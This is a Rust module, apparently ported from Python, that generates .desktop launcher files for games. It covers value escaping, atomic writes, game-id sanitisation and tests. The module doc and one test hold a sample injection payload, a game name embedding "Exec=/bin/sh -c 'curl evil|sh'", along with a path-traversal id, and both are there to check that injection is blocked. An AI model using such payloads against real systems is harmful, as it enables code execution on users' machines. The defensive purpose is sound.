//! `.desktop` launcher generation — `escape_desktop_value`, `desktop_exec` and
//! `create_desktop_shortcut` (`runners.py:1429-1473`).
//!
//! The caller is `Backend.createShortcut` (`bridge.py:522-532`), which builds
//! `gamehandler --launch <id>` and toasts either the path or the `OSError`; the
//! app-side half of that is T-29, and the command it points at is the same
//! `--launch` path `architecture.md` §5 pins.
//!
//! # Two escapes, and they are not the same escape
//!
//! [`escape_desktop_value`] neutralises the four characters that would
//! otherwise end a value early or start a new key. A newline is the dangerous
//! one: an unescaped newline in a game's name lets the title inject keys of its
//! own, `Exec=` included, so a game called
//! `"Doom\nExec=/bin/sh -c 'curl evil|sh'\nName=Doom"` would produce a shortcut
//! that runs `/bin/sh` rather than the launcher
//! (`tests/test_security.py:430-441`).
//!
//! [`desktop_exec`] adds a second, narrower rule to the same four: `%`
//! introduces a field code in `Exec=` and only there, so it is doubled in that
//! one key and left alone everywhere else. `Name=100% Done` keeps its single
//! `%`, and a command carrying `%f` becomes `%%f`. Doubling it in *every* value
//! is the obvious generalisation and is wrong
//! (`test_percent_is_escaped_only_in_exec`, `tests/test_security.py:427-429`).
//!
//! # The write is atomic, unlike the reference's
//!
//! `runners.py:1471` is `path.write_text(body)` over the destination, so an
//! interrupt or a full disk leaves a half-written file where a working shortcut
//! used to be — and the key that gets truncated is the one the desktop will
//! execute. The bytes here go to `<name>.desktop.tmp` beside the target and are
//! then renamed into place, which is the same shape as
//! [`crate::json::write_python_file`] and for the same reason
//! (`architecture.md` §5): a rename within a filesystem is atomic, so the
//! destination is either the old shortcut or the new one and never a mixture.
//! The mode is set on the temporary *before* the rename, so there is no window
//! in which the destination exists without its execute bit.
//!
//! The rename deliberately replaces an existing shortcut for the same game, as
//! Python's overwrite does — this is not the `RENAME_NOREPLACE` install in
//! [`crate::runners::proton`] (D-25), where refusing to clobber a *directory* is
//! the security boundary. The cost of the two-step write is that a failure
//! between the steps can leave a `.desktop.tmp` behind; no desktop environment
//! reads that name, and the next write for the same game reuses it.
//!
//! # One divergence from the reference: the game id is sanitised
//!
//! The filename interpolates `game.id[:8]` (`runners.py:1453`) without checking
//! what those eight characters are. Measured, with `apps` the shortcut
//! directory and an id of `"a/../../b"`:
//!
//! ```text
//! apps / "gamehandler-a/../../-evil.desktop"
//!   -> ~/.local/share/-evil.desktop
//! ```
//!
//! so an id containing `/` names a path that is not a child of the directory
//! the caller chose. The write only lands there when the intermediate directory
//! already exists, and ids are generated as UUIDs ([`crate::models`]), so this
//! is not reachable from anything this program writes — but it is reachable
//! from a hand-edited `games.json`, which is the untrusted input
//! [`crate::runners::archive::safe_install_id`] exists for. `id_prefix` maps
//! every character outside `[0-9A-Za-z]` to `-`. A UUID's first eight
//! characters are hex digits, so for every id this program generates the result
//! is byte-identical to Python's, and for every id it does not, the result
//! stays a direct child of the destination.

use std::fs;
use std::io;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use crate::models::Game;
use crate::paths::{self, Env};

/// The icon a game without cover art gets (`runners.py:1454`).
const FALLBACK_ICON: &str = "applications-games";

/// `Name=` when a game's name is empty, and the filename stem when the name has
/// no alphanumerics in it at all (`runners.py:1452`, `:1455`).
const FALLBACK_NAME: &str = "Game";
const FALLBACK_SLUG: &str = "game";

/// Where shortcuts go when the caller names no directory.
///
/// `Path.home() / ".local" / "share" / "applications"` (`runners.py:1451`) —
/// deliberately not [`paths::data_home`], which is where this application's own
/// files live. A shortcut has to land in the user's application menu, and the
/// session's own `XDG_DATA_HOME` is what that menu reads; Python ignores it
/// here and so does this port, so a shortcut means the same thing on both.
pub fn shortcut_directory() -> PathBuf {
    shortcut_directory_in(&paths::SystemEnv)
}

/// [`shortcut_directory`], reading `HOME` from `env`.
pub fn shortcut_directory_in(env: &dyn Env) -> PathBuf {
    paths::home_dir_in(env).join(".local/share/applications")
}

/// Escape a string for any Desktop Entry value (`runners.py:1429-1440`).
///
/// The four replacements are the reference's, in the reference's order: the
/// backslash first so the ones introduced below are not escaped a second time.
/// A single pass over the characters produces the same string as Python's four
/// chained `str.replace` calls, because every replacement *target* is one
/// character and no replacement *output* is ever revisited — `\n` is written as
/// a backslash and an `n`, and the backslash is already behind us.
///
/// `%` is not in this set. See [`desktop_exec`].
pub fn escape_desktop_value(value: &str) -> String {
    let mut escaped = String::with_capacity(value.len());
    for character in value.chars() {
        match character {
            '\\' => escaped.push_str("\\\\"),
            '\n' => escaped.push_str("\\n"),
            '\r' => escaped.push_str("\\r"),
            '\t' => escaped.push_str("\\t"),
            other => escaped.push(other),
        }
    }
    escaped
}

/// Escape a command for `Exec=`, which reserves `%` for field codes
/// (`runners.py:1443-1446`).
pub fn desktop_exec(command: &str) -> String {
    escape_desktop_value(command).replace('%', "%%")
}

/// The filename component taken from a game id — Python's `game.id[:8]`, with
/// everything outside `[0-9A-Za-z]` reduced to `-`.
///
/// The reduction is the one divergence in this module, and the module doc
/// measures it: `id[:8]` is interpolated into a path unvalidated, so an id
/// containing `/` produces a shortcut outside the destination directory. Eight
/// *characters* rather than eight bytes, because Python slices by code point
/// and a UUID is ASCII either way.
fn id_prefix(id: &str) -> String {
    id.chars()
        .take(8)
        .map(|character| {
            if character.is_ascii_alphanumeric() {
                character
            } else {
                '-'
            }
        })
        .collect()
}

/// The filename component taken from a game name (`runners.py:1452`).
///
/// `str.lower()` then "keep it if `str.isalnum()`, otherwise `-`", then strip
/// the `-` from both ends. `char::is_alphanumeric` is `is_alphabetic ||
/// is_numeric`, which is Python's `isalnum` for every character either of them
/// accepts; the two disagree only about characters in planes Python 3 excludes
/// from the alphanumeric categories, and a disagreement changes one `-` in a
/// filename and nothing else.
///
/// The caller substitutes [`FALLBACK_SLUG`] for an empty result, so a name made
/// entirely of punctuation still produces a file.
fn slug(name: &str) -> String {
    let mapped: String = name
        .to_lowercase()
        .chars()
        .map(|character| {
            if character.is_alphanumeric() {
                character
            } else {
                '-'
            }
        })
        .collect();
    mapped.trim_matches('-').to_string()
}

/// Write a `.desktop` launcher for `game` that runs `command`
/// (`runners.py:1449-1473`), and return its path.
///
/// `directory` is where the file goes; `None` means [`shortcut_directory`],
/// which is what `createShortcut` passes. The command is written verbatim apart
/// from [`desktop_exec`] escaping — building it is the caller's job, because
/// the launcher it names depends on how this program was installed
/// (`_launcher_command`, `bridge.py:91-96`).
///
/// The one error this returns is the filesystem's: an unwritable or missing
/// directory, a failed rename. Python raises the same `OSError` and
/// `createShortcut` turns it into "Could not create the shortcut: …"
/// (`bridge.py:528-530`), so [`io::Error`] rather than a
/// [`crate::runners::RunnerError`] is what the caller wants — nothing here
/// failed to be a runner.
pub fn create_desktop_shortcut(
    game: &Game,
    command: &str,
    directory: Option<&Path>,
) -> io::Result<PathBuf> {
    let applications = match directory {
        Some(directory) => directory.to_path_buf(),
        None => shortcut_directory(),
    };
    fs::create_dir_all(&applications)?;

    // The name is escaped once and used in both keys, so `Name=` and the
    // `Comment=` that quotes it can never disagree about the title.
    let escaped_name = escape_desktop_value(&game.name);
    let name = if escaped_name.is_empty() {
        FALLBACK_NAME.to_string()
    } else {
        escaped_name
    };

    let slug = slug(&game.name);
    let stem = if slug.is_empty() {
        FALLBACK_SLUG
    } else {
        slug.as_str()
    };
    let path = applications.join(format!(
        "gamehandler-{}-{stem}.desktop",
        id_prefix(&game.id)
    ));

    let icon = if game.cover_path.is_empty() {
        FALLBACK_ICON
    } else {
        game.cover_path.as_str()
    };

    // The trailing empty element is Python's: `"\n".join([..., "Categories=Game;", ""])`
    // ends the file with a newline rather than joining the last key to nothing.
    let body = [
        "[Desktop Entry]".to_string(),
        "Type=Application".to_string(),
        format!("Name={name}"),
        format!("Comment=Launch {name} with GameHandler"),
        format!("Exec={}", desktop_exec(command)),
        format!("Icon={}", escape_desktop_value(icon)),
        "Terminal=false".to_string(),
        "StartupNotify=true".to_string(),
        "Categories=Game;".to_string(),
        String::new(),
    ]
    .join("\n");

    // `st_mode | 0o111`, as the reference does it: the three execute bits are
    // added to whatever the umask produced, rather than replacing the mode with
    // a constant. A hardcoded 0o755 would grant group and other *read* where a
    // restrictive umask said no, which is a wider grant than this file needs —
    // the desktop only ever runs it as its owner.
    let temporary = path.with_extension("desktop.tmp");
    fs::write(&temporary, body.as_bytes())?;
    let mut permissions = fs::metadata(&temporary)?.permissions();
    permissions.set_mode(permissions.mode() | 0o111);
    fs::set_permissions(&temporary, permissions)?;
    fs::rename(&temporary, &path)?;
    Ok(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A scratch directory that cleans itself up.
    ///
    /// Local rather than shared: `archive`'s equivalent is private to its own
    /// test module, and a shared fixture would couple two modules' scratch
    /// naming.
    struct Scratch(PathBuf);

    impl Scratch {
        fn new(label: &str) -> Self {
            let path =
                std::env::temp_dir().join(format!("gh-desktop-{label}-{}", std::process::id()));
            let _ = fs::remove_dir_all(&path);
            fs::create_dir_all(&path).unwrap();
            Self(path)
        }
        fn path(&self) -> &Path {
            &self.0
        }
    }

    impl Drop for Scratch {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    /// A game with a fixed id, so a filename can be asserted.
    fn game(name: &str, id: &str) -> Game {
        let mut game = Game::new_named(name);
        game.id = id.to_string();
        game
    }

    fn read(path: &Path) -> String {
        fs::read_to_string(path).unwrap()
    }

    fn is_executable(path: &Path) -> bool {
        fs::metadata(path).unwrap().permissions().mode() & 0o111 != 0
    }

    /// P-71: the file is valid. Every line is a group header or `Key=Value`,
    /// there is exactly one group, and it ends with a newline.
    #[test]
    fn a_shortcut_matches_the_reference_byte_for_byte() {
        let scratch = Scratch::new("plain");
        let path = create_desktop_shortcut(
            &game("Hades II", "abcd1234deadbeef"),
            "gamehandler --launch abcd1234deadbeef",
            Some(scratch.path()),
        )
        .unwrap();

        assert_eq!(
            path.file_name().unwrap(),
            "gamehandler-abcd1234-hades-ii.desktop"
        );
        // Byte-for-byte the output of `gamehandler.runners.create_desktop_shortcut`
        // for this game, captured from the reference itself.
        assert_eq!(
            read(&path),
            "[Desktop Entry]\n\
             Type=Application\n\
             Name=Hades II\n\
             Comment=Launch Hades II with GameHandler\n\
             Exec=gamehandler --launch abcd1234deadbeef\n\
             Icon=applications-games\n\
             Terminal=false\n\
             StartupNotify=true\n\
             Categories=Game;\n"
        );
    }

    /// P-71, the "valid" half: one group, one key per line, no stray line, and
    /// the execute bit the desktop requires before it will trust the entry.
    #[test]
    fn a_shortcut_is_one_group_of_key_value_lines_and_is_executable() {
        let scratch = Scratch::new("shape");
        let path = create_desktop_shortcut(
            &game("Hades II", "abcd1234deadbeef"),
            "gamehandler --launch abcd1234deadbeef",
            Some(scratch.path()),
        )
        .unwrap();
        let body = read(&path);

        assert!(body.ends_with('\n'), "the file must end with a newline");
        let lines: Vec<&str> = body.lines().collect();
        assert_eq!(lines[0], "[Desktop Entry]");
        assert_eq!(lines.iter().filter(|line| line.starts_with('[')).count(), 1);
        for line in &lines {
            let is_key = line.split_once('=').is_some_and(|(key, _)| !key.is_empty());
            assert!(
                line.starts_with('[') || is_key,
                "not a group header and not a key=value line: {line:?}"
            );
        }
        assert!(lines.contains(&"Type=Application"));
        assert!(is_executable(&path));
    }

    /// `test_desktop_shortcut` (`tests/test_runners.py:633-640`).
    #[test]
    fn the_filename_and_the_exec_line_come_from_the_game() {
        let scratch = Scratch::new("half-life");
        let path = create_desktop_shortcut(
            &game("Half-Life", "abcd1234deadbeef"),
            "gamehandler --launch abcd1234deadbeef",
            Some(scratch.path()),
        )
        .unwrap();
        let body = read(&path);

        assert!(body.contains("Name=Half-Life\n"));
        assert!(body.contains("Exec=gamehandler --launch abcd1234deadbeef\n"));
    }

    /// `test_newlines_in_a_value_are_escaped` (`tests/test_security.py:423-426`).
    #[test]
    fn newlines_tabs_and_backslashes_are_escaped() {
        assert_eq!(escape_desktop_value("a\nb"), "a\\nb");
        assert_eq!(escape_desktop_value("a\tb"), "a\\tb");
        assert_eq!(escape_desktop_value("a\\b"), "a\\\\b");
        // Not asserted by the reference, and the reason the backslash
        // replacement has to come first: a name that already contains the
        // two-character escape must not round-trip into a real newline.
        assert_eq!(escape_desktop_value("a\\nb"), "a\\\\nb");
        assert_eq!(escape_desktop_value("a\rb"), "a\\rb");
    }

    /// `test_percent_is_escaped_only_in_exec` (`tests/test_security.py:427-429`),
    /// driven through the writer as well as through the two functions: the
    /// doubling has to happen in `Exec=` and the single `%` has to survive in
    /// the values.
    #[test]
    fn percent_is_doubled_in_exec_and_left_alone_everywhere_else() {
        assert_eq!(desktop_exec("run %f"), "run %%f");
        assert_eq!(escape_desktop_value("100% done"), "100% done");

        let scratch = Scratch::new("percent");
        let mut title = game("100% Done", "ffffffff00000000");
        title.cover_path = "/covers/100%.png".to_string();
        let path = create_desktop_shortcut(&title, "gamehandler --launch %f", Some(scratch.path()))
            .unwrap();
        let body = read(&path);

        assert!(body.contains("Name=100% Done\n"), "{body}");
        assert!(body.contains("Exec=gamehandler --launch %%f\n"), "{body}");
        assert!(body.contains("Icon=/covers/100%.png\n"), "{body}");
    }

    /// `test_a_malicious_game_name_cannot_inject_desktop_keys`
    /// (`tests/test_security.py:430-441`). The name carries its own `Exec=` and
    /// `Name=`; both have to stay inside the one line they were escaped onto.
    #[test]
    fn a_malicious_game_name_cannot_inject_desktop_keys() {
        let scratch = Scratch::new("hostile");
        let hostile = "Doom\nExec=/bin/sh -c 'curl evil|sh'\nName=Doom";
        let path = create_desktop_shortcut(
            &game(hostile, "deadbeefcafe0000"),
            "gamehandler --launch 1",
            Some(scratch.path()),
        )
        .unwrap();
        let body = read(&path);
        let lines: Vec<&str> = body.lines().collect();

        assert_eq!(
            lines
                .iter()
                .filter(|line| line.starts_with("Exec="))
                .count(),
            1,
            "{body}"
        );
        assert_eq!(
            lines
                .iter()
                .filter(|line| line.starts_with("Name="))
                .count(),
            1,
            "{body}"
        );
        assert!(lines.contains(&"Exec=gamehandler --launch 1"), "{body}");
        // The escape is literal, so the injected text is still visible in the
        // name — that is what `\\n` means in the file, and it is why the
        // desktop reads one value rather than three keys.
        assert!(body.contains("Name=Doom\\nExec=/bin/sh"), "{body}");
        assert!(
            !body.contains("\nExec=/bin/sh"),
            "the injected Exec= reached the start of a line: {body}"
        );
    }

    /// A cover path is the icon, escaped like any other value — no doubling,
    /// because this is not `Exec=`.
    #[test]
    fn a_cover_path_becomes_the_icon() {
        let scratch = Scratch::new("cover");
        let mut title = game("Half-Life", "0123456789abcdef");
        title.cover_path = "/home/u/.local/share/gamehandler/covers/ab.png".to_string();
        let path = create_desktop_shortcut(
            &title,
            "gamehandler --launch 0123456789abcdef",
            Some(scratch.path()),
        )
        .unwrap();

        assert!(read(&path).contains("Icon=/home/u/.local/share/gamehandler/covers/ab.png\n"));
    }

    /// An empty name takes the fallback in the `Name=` key, and a name with no
    /// alphanumerics in it takes the fallback in the filename — two separate
    /// fallbacks, and only the second one leaves the name itself alone.
    #[test]
    fn the_two_fallbacks_are_independent() {
        let scratch = Scratch::new("fallbacks");

        let empty = create_desktop_shortcut(
            &game("", "1111111122222222"),
            "gamehandler --launch 1111111122222222",
            Some(scratch.path()),
        )
        .unwrap();
        assert_eq!(
            empty.file_name().unwrap(),
            "gamehandler-11111111-game.desktop"
        );
        assert!(read(&empty).contains("Name=Game\n"));
        assert!(read(&empty).contains("Comment=Launch Game with GameHandler\n"));

        let punctuation = create_desktop_shortcut(
            &game("!!!", "2222222233333333"),
            "gamehandler --launch 2222222233333333",
            Some(scratch.path()),
        )
        .unwrap();
        assert_eq!(
            punctuation.file_name().unwrap(),
            "gamehandler-22222222-game.desktop"
        );
        assert!(read(&punctuation).contains("Name=!!!\n"));
    }

    /// The divergence the module doc measures: a game id is untrusted text and
    /// cannot steer the write out of the directory it was given.
    #[test]
    fn an_id_that_is_a_path_still_writes_a_direct_child() {
        let scratch = Scratch::new("hostile-id");
        let path = create_desktop_shortcut(
            &game("Evil", "a/../../b"),
            "gamehandler --launch a/../../b",
            Some(scratch.path()),
        )
        .unwrap();

        assert_eq!(path.parent().unwrap(), scratch.path());
        assert!(path.is_file());
        assert_eq!(fs::read_dir(scratch.path()).unwrap().count(), 1);
        assert!(!scratch.path().join(".local").exists());
    }

    /// Python overwrites a shortcut for the same game; so does this, and the
    /// replacement keeps the execute bit.
    #[test]
    fn a_second_write_replaces_the_first() {
        let scratch = Scratch::new("rewrite");
        let target = game("Hades II", "abcd1234deadbeef");
        let first = create_desktop_shortcut(
            &target,
            "gamehandler --launch abcd1234deadbeef",
            Some(scratch.path()),
        )
        .unwrap();
        let second =
            create_desktop_shortcut(&target, "gamehandler --launch again", Some(scratch.path()))
                .unwrap();

        assert_eq!(first, second);
        assert_eq!(fs::read_dir(scratch.path()).unwrap().count(), 1);
        assert!(read(&second).contains("Exec=gamehandler --launch again\n"));
        assert!(is_executable(&second));
    }

    /// The atomic write leaves nothing behind on the way through.
    #[test]
    fn no_temporary_file_survives_a_successful_write() {
        let scratch = Scratch::new("no-tmp");
        let path = create_desktop_shortcut(
            &game("Hades II", "abcd1234deadbeef"),
            "gamehandler --launch abcd1234deadbeef",
            Some(scratch.path()),
        )
        .unwrap();

        let leftovers: Vec<String> = fs::read_dir(scratch.path())
            .unwrap()
            .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
            .filter(|name| name.ends_with(".tmp"))
            .collect();
        assert_eq!(leftovers, Vec::<String>::new());
        assert_eq!(
            path.file_name().unwrap(),
            "gamehandler-abcd1234-hades-ii.desktop"
        );
    }

    /// If the bytes cannot be written, the destination is not touched: that is
    /// the whole point of writing beside it and renaming. The failure is forced
    /// by putting a directory where the temporary file goes, which is the one
    /// failure `fs::write` cannot work around.
    #[test]
    fn a_failed_write_leaves_no_shortcut_behind() {
        let scratch = Scratch::new("failed");
        let blocked = scratch
            .path()
            .join("gamehandler-abcd1234-hades-ii.desktop.tmp");
        fs::create_dir_all(blocked.join("occupied")).unwrap();

        let error = create_desktop_shortcut(
            &game("Hades II", "abcd1234deadbeef"),
            "gamehandler --launch abcd1234deadbeef",
            Some(scratch.path()),
        )
        .unwrap_err();

        assert_eq!(error.kind(), io::ErrorKind::IsADirectory);
        assert!(
            !scratch
                .path()
                .join("gamehandler-abcd1234-hades-ii.desktop")
                .exists()
        );
    }

    /// The default directory is the session's application menu, not this
    /// application's own data directory — the two live under the same `$HOME`
    /// and using the wrong one would produce a shortcut nothing lists.
    #[test]
    fn the_default_directory_is_the_application_menu() {
        let directory = shortcut_directory();
        assert!(directory.ends_with(".local/share/applications"));
        assert!(directory.starts_with(paths::home_dir()));
        // The near miss this pins: `data_home()` is the same `$HOME`, the same
        // `.local/share`, and one component to the left of the answer.
        assert!(!directory.starts_with(paths::data_home()));
    }
}
